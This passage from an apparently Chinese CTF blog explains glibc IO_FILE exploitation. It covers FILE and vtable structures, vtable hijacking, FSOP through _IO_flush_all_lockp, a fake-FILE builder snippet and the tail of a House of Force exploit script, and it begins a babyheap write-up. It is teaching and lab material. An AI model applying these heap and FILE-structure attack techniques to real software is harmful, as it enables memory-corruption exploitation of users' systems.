class="number">0x40</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Host:&quot;</span>,p32(<span class="number">0xffffffff</span>))</span><br><span class="line"></span><br><span class="line">top_chunk = heap_base + <span class="number">0xd8</span></span><br><span class="line">heap_array = <span class="number">0x804B120</span></span><br><span class="line">offset = heap_array - top_chunk</span><br><span class="line">add(offset-<span class="number">0x98</span>,<span class="string">&#x27;aaa&#x27;</span>+<span class="string">&#x27;\n&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>上面最后的一步申请导致top chunk往低地址抬，接下来再申请一个正的size就可以得到.bss段的chunk</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ top_chunk</span><br><span class="line">0x804b090 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0x0, </span><br><span class="line">  size = 0xf34041, </span><br><span class="line">  fd = 0x0, </span><br><span class="line">  bk = 0x0, </span><br><span class="line">  fd_nextsize = 0xff0cbfb0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/06/08/IO-FILE/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CharonPt的Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/06/08/IO-FILE/" class="post-title-link" itemprop="url">IO_FILE</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-06-08 13:56:12" itemprop="dateCreated datePublished" datetime="2022-06-08T13:56:12+08:00">2022-06-08</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-08-07 19:50:40" itemprop="dateModified" datetime="2022-08-07T19:50:40+08:00">2022-08-07</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="笔记"><a href="#笔记" class="headerlink" title="笔记"></a>笔记</h3><p>记一下不错的文章：<a target="_blank" rel="noopener" href="https://ray-cp.github.io/archivers/IO_FILE_arbitrary_read_write">IO FILE 之任意读写 « 平凡路上 (ray-cp.github.io)</a></p>
<p>FILE 在 Linux 系统的标准 IO 库中是用于描述文件的结构，称为文件流。</p>
<p>在标准的I/O库中，每个进程启动时有三个文件流是自动打开的：stdin、stdout、stderr。因此在初始状态下，程序会产生三个FILE结构，这三个结构对应的符号为：<code>_IO_2_1_stdin_</code>、<code>_IO_2_1_stdout_</code>、<code>_IO_2_1_stderr</code>，且这三个FILE结构都位于libc段。</p>
<p>FILE结构如下构成</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> _flags;       <span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_ptr;   <span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_end;   <span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_base;  <span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_base; <span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_ptr;  <span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_end;  <span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_base;   <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_end;    <span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> _fileno;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">  <span class="keyword">int</span> _blksize;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">  <span class="keyword">int</span> _flags2;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it&#x27;s too small.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> _cur_column;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">char</span> _vtable_offset;</span><br><span class="line">  <span class="keyword">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_complete</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> _<span class="title">file</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined _G_IO_IO_FILE_VERSION &amp;&amp; _G_IO_IO_FILE_VERSION == 0x20001</span></span><br><span class="line">  _IO_off64_t _offset;</span><br><span class="line"><span class="meta"># <span class="meta-keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">  <span class="comment">/* Wide character stream stuff.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *_<span class="title">codecvt</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> *_<span class="title">wide_data</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">freeres_list</span>;</span></span><br><span class="line">  <span class="keyword">void</span> *_freeres_buf;</span><br><span class="line"><span class="meta"># <span class="meta-keyword">else</span></span></span><br><span class="line">  <span class="keyword">void</span> *__pad1;</span><br><span class="line">  <span class="keyword">void</span> *__pad2;</span><br><span class="line">  <span class="keyword">void</span> *__pad3;</span><br><span class="line">  <span class="keyword">void</span> *__pad4;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">size_t</span> __pad5;</span><br><span class="line">  <span class="keyword">int</span> _mode;</span><br><span class="line">  <span class="comment">/* Make sure we don&#x27;t get into trouble again.  */</span></span><br><span class="line">  <span class="keyword">char</span> _unused2[<span class="number">15</span> * <span class="keyword">sizeof</span> (<span class="keyword">int</span>) - <span class="number">4</span> * <span class="keyword">sizeof</span> (<span class="keyword">void</span> *) - <span class="keyword">sizeof</span> (<span class="keyword">size_t</span>)];</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>举个例子，<code>_IO_2_1_stderr_</code>结构如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ p _IO_2_1_stderr_</span><br><span class="line">$<span class="number">3</span> = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = <span class="number">0xfbad2087</span>, </span><br><span class="line">    _IO_read_ptr = <span class="number">0x7ffff7fb7663</span> &lt;_IO_2_1_stderr_+<span class="number">131</span>&gt; <span class="string">&quot;&quot;</span>, </span><br><span class="line">    _IO_read_end = <span class="number">0x7ffff7fb7663</span> &lt;_IO_2_1_stderr_+<span class="number">131</span>&gt; <span class="string">&quot;&quot;</span>, </span><br><span class="line">    _IO_read_base = <span class="number">0x7ffff7fb7663</span> &lt;_IO_2_1_stderr_+<span class="number">131</span>&gt; <span class="string">&quot;&quot;</span>, </span><br><span class="line">    _IO_write_base = <span class="number">0x7ffff7fb7663</span> &lt;_IO_2_1_stderr_+<span class="number">131</span>&gt; <span class="string">&quot;&quot;</span>, </span><br><span class="line">    _IO_write_ptr = <span class="number">0x7ffff7fb7663</span> &lt;_IO_2_1_stderr_+<span class="number">131</span>&gt; <span class="string">&quot;&quot;</span>, </span><br><span class="line">    _IO_write_end = <span class="number">0x7ffff7fb7663</span> &lt;_IO_2_1_stderr_+<span class="number">131</span>&gt; <span class="string">&quot;&quot;</span>, </span><br><span class="line">    _IO_buf_base = <span class="number">0x7ffff7fb7663</span> &lt;_IO_2_1_stderr_+<span class="number">131</span>&gt; <span class="string">&quot;&quot;</span>, </span><br><span class="line">    _IO_buf_end = <span class="number">0x7ffff7fb7664</span> &lt;_IO_2_1_stderr_+<span class="number">132</span>&gt; <span class="string">&quot;&quot;</span>, </span><br><span class="line">    _IO_save_base = <span class="number">0x0</span>, </span><br><span class="line">    _IO_backup_base = <span class="number">0x0</span>, </span><br><span class="line">    _IO_save_end = <span class="number">0x0</span>, </span><br><span class="line">    _markers = <span class="number">0x0</span>, </span><br><span class="line">    _chain = <span class="number">0x7ffff7fb76c0</span> &lt;_IO_2_1_stdout_&gt;, </span><br><span class="line">    _fileno = <span class="number">0x2</span>, </span><br><span class="line">    _flags2 = <span class="number">0x0</span>, </span><br><span class="line">    _old_offset = <span class="number">0xffffffffffffffff</span>, </span><br><span class="line">    _cur_column = <span class="number">0x0</span>, </span><br><span class="line">    _vtable_offset = <span class="number">0x0</span>, </span><br><span class="line">    _shortbuf = <span class="string">&quot;&quot;</span>, </span><br><span class="line">    _lock = <span class="number">0x7ffff7fb9660</span> &lt;_IO_stdfile_2_lock&gt;, </span><br><span class="line">    _offset = <span class="number">0xffffffffffffffff</span>, </span><br><span class="line">    _codecvt = <span class="number">0x0</span>, </span><br><span class="line">    _wide_data = <span class="number">0x7ffff7fb67a0</span> &lt;_IO_wide_data_2&gt;, </span><br><span class="line">    _freeres_list = <span class="number">0x0</span>, </span><br><span class="line">    _freeres_buf = <span class="number">0x0</span>, </span><br><span class="line">    __pad5 = <span class="number">0x0</span>, </span><br><span class="line">    _mode = <span class="number">0x0</span>, </span><br><span class="line">    _unused2 = <span class="string">&#x27;\000&#x27;</span> &lt;repeats <span class="number">19</span> times&gt;</span><br><span class="line">  &#125;, </span><br><span class="line">  vtable = <span class="number">0x7ffff7fb84a0</span> &lt;_IO_file_jumps&gt;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>注意其中的file才是<code>_IO_FILE</code>结构</p>
<p>同时<code>_IO_FILE</code>结构外包裹着另一种结构<code>_IO_FILE_plus</code>，这个结构就相当于<code>_IO_FILE + vtable</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    _IO_FILE    file;</span><br><span class="line">    IO_jump_t   *vtable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>每个FILE结构会通过其中的<code>_chain</code>域来串联成一个单向链表，链表的头部记录在<code>_IO_list_all</code>这个全局变量中，程序可以通过其来遍历所有FILE结构。</p>
<p>初始时<code>_IO_list_all -&gt; _IO_2_1_stderr_ -&gt; _IO_2_1_stdout_ -&gt; _IO_2_1_stdin_</code></p>
<p>当程序调用<code>fopen</code>时，意味着一个新的FILE结构会被创建，其步骤如下：</p>
<ul>
<li>使用 malloc 分配 FILE 结构</li>
<li>设置 FILE 结构的 vtable</li>
<li>初始化分配的 FILE 结构</li>
<li>将初始化的 FILE 结构链入 FILE 结构链表中</li>
<li>调用系统调用打开文件</li>
</ul>
<p>但是由<code>fopen</code>创建的文件流是分配在堆内存上的</p>
<h3 id="pwn-debug生成fake-IO-FILE"><a href="#pwn-debug生成fake-IO-FILE" class="headerlink" title="pwn_debug生成fake_IO_FILE"></a>pwn_debug生成fake_IO_FILE</h3><p>用pwn_debug的类来快捷生成伪造的<code>_IO_FLE_plus</code>结构，如下即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn_debug <span class="keyword">import</span> *</span><br><span class="line">fake_FILE = IO_FIEL_plus()</span><br><span class="line">flag=<span class="number">0</span></span><br><span class="line">flag&amp;=~<span class="number">8</span></span><br><span class="line">flag|=<span class="number">0x8000</span></span><br><span class="line">fake_FILE._flags = flag</span><br><span class="line">fake_FILE._IO_write_ptr = <span class="number">1</span></span><br><span class="line">fake_FILE._IO_write_base = <span class="number">0</span></span><br><span class="line">fake_FILE.vtable = <span class="number">0x61616161</span></span><br><span class="line">fake_FILE.show()</span><br></pre></td></tr></table></figure>

<h2 id="劫持vtable"><a href="#劫持vtable" class="headerlink" title="劫持vtable"></a>劫持vtable</h2><p>简单点说就是在一些函数的调用链中存在“通过vtable指针到一个结构体中找到对应函数指针来调用函数”的这一过程，同时vtable本身也是个指针，所以这里就有两种思路：①直接修改vtable指向的结构体中的函数指针。②修改vtable指针，使其指向一片我们可控的区域，再在里面布置函数指针。</p>
<p>但是从glibc-2.23开始，位于libc数据段的vtable指向的结构体不可写，所以要用第二种方法</p>
<p>要使用第二种方法的话需要知道函数最后会调用vtable中的哪个函数，这样才能对应地去修改</p>
<p>当然不是所有函数都会用到<code>_IO_FILE</code>结构，所以具体还得自己掌握</p>
<h4 id="例如"><a href="#例如" class="headerlink" title="例如"></a>例如</h4><p>以exit函数为例</p>
<blockquote>
<p>程序调用 <code>exit</code> 后，会遍历 <code>_IO_list_all</code> ，调用 <code>_IO_2_1_stdout_</code> 下的 <code>vtable</code> 中 <code>_setbuf</code> 函数。</p>
</blockquote>
<p>那么我们就知道<code>exit</code>函数会去调用<code>vtable</code>中的<code>_setbuf</code>，然后去查看<code>_setbuf</code>在<code>vtable</code>中的偏移</p>
<p>首先找到对应的流</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ p &amp;_IO_2_1_stdout_</span><br><span class="line">$1 = (struct _IO_FILE_plus *) 0x7fc602899620 &lt;_IO_2_1_stdout_&gt;</span><br></pre></td></tr></table></figure>

<p>在libc-2.23版本下，vtable位于_IO_FILE + 0x94/0xd8（32位/64位），由于版本的不同所以可以选择在IDA中搜索vtable符号来找到对应的偏移</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/gx 0x7fc602899620+0xd8</span><br><span class="line">0x7fc6028996f8 &lt;_IO_2_1_stdout_+216&gt;:	0x00007fc6028976e0</span><br><span class="line"></span><br><span class="line">gdb-peda$ x/32gx 0x00007fc6028976e0</span><br><span class="line">0x7fc6028976e0 &lt;_IO_file_jumps&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7fc6028976f0 &lt;_IO_file_jumps+16&gt;:	0x00007fc60254d9d0	0x00007fc60254e740</span><br><span class="line">0x7fc602897700 &lt;_IO_file_jumps+32&gt;:	0x00007fc60254e4b0	0x00007fc60254f610</span><br><span class="line">0x7fc602897710 &lt;_IO_file_jumps+48&gt;:	0x00007fc602550990	0x00007fc60254d1f0</span><br><span class="line">0x7fc602897720 &lt;_IO_file_jumps+64&gt;:	0x00007fc60254ced0	0x00007fc60254c4d0</span><br><span class="line">0x7fc602897730 &lt;_IO_file_jumps+80&gt;:	0x00007fc60254fa10	0x00007fc60254c440</span><br><span class="line">0x7fc602897740 &lt;_IO_file_jumps+96&gt;:	0x00007fc60254c380	0x00007fc602541190</span><br><span class="line">0x7fc602897750 &lt;_IO_file_jumps+112&gt;:	0x00007fc60254d1b0	0x00007fc60254cb80</span><br><span class="line">0x7fc602897760 &lt;_IO_file_jumps+128&gt;:	0x00007fc60254c980	0x00007fc60254c350</span><br><span class="line">0x7fc602897770 &lt;_IO_file_jumps+144&gt;:	0x00007fc60254cb70	0x00007fc602550b00</span><br><span class="line">0x7fc602897780 &lt;_IO_file_jumps+160&gt;:	0x00007fc602550b10	0x0000000000000000</span><br><span class="line"></span><br><span class="line">gdb-peda$ p _IO_file_jumps</span><br><span class="line">$2 = &#123;</span><br><span class="line">  __dummy = 0x0, </span><br><span class="line">  __dummy2 = 0x0, </span><br><span class="line">  __finish = 0x7fc60254d9d0 &lt;_IO_new_file_finish&gt;, </span><br><span class="line">  __overflow = 0x7fc60254e740 &lt;_IO_new_file_overflow&gt;, </span><br><span class="line">  __underflow = 0x7fc60254e4b0 &lt;_IO_new_file_underflow&gt;, </span><br><span class="line">  __uflow = 0x7fc60254f610 &lt;__GI__IO_default_uflow&gt;, </span><br><span class="line">  __pbackfail = 0x7fc602550990 &lt;__GI__IO_default_pbackfail&gt;, </span><br><span class="line">  __xsputn = 0x7fc60254d1f0 &lt;_IO_new_file_xsputn&gt;, </span><br><span class="line">  __xsgetn = 0x7fc60254ced0 &lt;__GI__IO_file_xsgetn&gt;, </span><br><span class="line">  __seekoff = 0x7fc60254c4d0 &lt;_IO_new_file_seekoff&gt;, </span><br><span class="line">  __seekpos = 0x7fc60254fa10 &lt;_IO_default_seekpos&gt;, </span><br><span class="line">  __setbuf = 0x7fc60254c440 &lt;_IO_new_file_setbuf&gt;, </span><br><span class="line">  __sync = 0x7fc60254c380 &lt;_IO_new_file_sync&gt;, </span><br><span class="line">  __doallocate = 0x7fc602541190 &lt;__GI__IO_file_doallocate&gt;, </span><br><span class="line">  __read = 0x7fc60254d1b0 &lt;__GI__IO_file_read&gt;, </span><br><span class="line">  __write = 0x7fc60254cb80 &lt;_IO_new_file_write&gt;, </span><br><span class="line">  __seek = 0x7fc60254c980 &lt;__GI__IO_file_seek&gt;, </span><br><span class="line">  __close = 0x7fc60254c350 &lt;__GI__IO_file_close&gt;, </span><br><span class="line">  __stat = 0x7fc60254cb70 &lt;__GI__IO_file_stat&gt;, </span><br><span class="line">  __showmanyc = 0x7fc602550b00 &lt;_IO_default_showmanyc&gt;, </span><br><span class="line">  __imbue = 0x7fc602550b10 &lt;_IO_default_imbue&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到<code>_setbuf</code>对应的偏移是0x58，那么只需要在伪造的vtable+0x58的这个位置布置函数指针即可。</p>
<p>puts函数会调用<code>_IO_2_1_stdout_</code>的<code>vtable</code>中的<code>__xsputn</code>，但由于puts函数在程序中经常被调用，所以如果先改虚表再布置指针的话就会出现错误，这时就可以选择先在一个地址上布置函数指针，然后再改<code>_IO_2_1_stdout_</code>的虚表指针，这样就没有问题。</p>
<h2 id="FSOP"><a href="#FSOP" class="headerlink" title="FSOP"></a>FSOP</h2><p>补充：经过测试发现似乎在新版本libc中触发abort后程序会先调用raise进而kill掉程序，不会执行到<code>_IO_flush_all_lockp</code>了（不确定）</p>
<p>由前面可知程序会通过<code>_IO_list_all</code>来寻找FILE结构，所以FSOP的核心就在于修改<code>_IO_list_all</code>的值使得我们能够伪造链表以及<code>_IO_FILE</code>，同时其利用<code>_IO_flush_all_lockp</code>来触发攻击，<code>_IO_flush_all_lockp</code>函数会在一些情况下被调用：</p>
<ol>
<li>当libc执行abort流程时（比如破坏堆结构后被check到了等等）</li>
<li>程序显式调用exit时</li>
<li>程序执行流从main函数返回时</li>
</ol>
<p>该函数部分源码如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_flush_all_lockp (<span class="keyword">int</span> do_lock)</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  fp = (_IO_FILE *) _IO_list_all;</span><br><span class="line">  <span class="keyword">while</span> (fp != <span class="literal">NULL</span>)</span><br><span class="line">  &#123;</span><br><span class="line">       ...</span><br><span class="line">       <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base))</span><br><span class="line">               &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">           &#123;</span><br><span class="line">               result = EOF;</span><br><span class="line">          &#125;</span><br><span class="line">        ...</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可见其在满足<code>fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code>的情况下就会调用<code>_IO_FILE_plus.vtable</code>中的<code>_IO_overflow</code>函数，而我们将<code>_IO_list_all</code>的值修改成我们可控的地址，也就意味着<code>vtable</code>的值是可控的，也就意味着<code>vtable</code>中的函数指针是可控的，所以就可以通过这种方式来让程序调用我们控制的<code>_IO_overflow</code>指针</p>
<p>稍微梳理一下其实可以发现，FSOP的本质其实仍然是劫持vtable，只不过这次其先将<code>_IO_list_all</code>劫持了，就相当可以伪造整个<code>_IO_FILE_plus</code>结构。</p>
<p>同时要注意满足<code>fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code>这个条件，在FILE结构中可见它们三个的偏移分别为：0xc0、0x28、0x20</p>
<h3 id="wdb-2018-1st-babyheap"><a href="#wdb-2018-1st-babyheap" class="headerlink" title="wdb_2018_1st_babyheap"></a>wdb_2018_1st_babyheap</h3><p><strong>版本：glibc-2.23</strong></p>
<p><strong>简单描述一下题目：add固定malloc(0x20)，最多申请十个堆，delete有UAF，普通的show和edit</strong></p>
<p>总结：这题的方法对于目前新版本来说已经不适用了（无法使用unsorted bin attack以及虚表的check），但是通过这题学习到的重点应该是对虚表指针调用以及<code>_IO_flush_all_lockp</code>函数的了解，还有就是这种“虽然当前结构无法完全控制，但是可以通过一些方法来让下一个结构是可控的”的思想吧。</p>
<p>题目思路：首先回顾一下<code>_IO_flush_all_lockp</code>函数的作用</p>
<blockquote>
<p><code>_IO_flush_all_lockp</code>，这个函数会刷新<code>_IO_list_all</code> 链表中所有项的文件流，相当于对每个 FILE 调用 fflush，也对应着会调用<code>_IO_FILE_plus.vtable </code>中的<code>_IO_overflow</code>。</p>
</blockquote>
<p>这句话的重点在后半段，结合源码看下这部分：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">  fp = (_IO_FILE *) _IO_list_all;</span><br><span class="line">  <span class="keyword">while</span> (fp != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      run_fp = fp;</span><br><span class="line">      <span class="keyword">if</span> (do_lock)</span><br><span class="line">	_IO_flockfile (fp);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">	   || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">	       &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">				    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	   )</span><br><span class="line">	  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">	result = EOF;</span><br></pre></td></tr></table></figure>

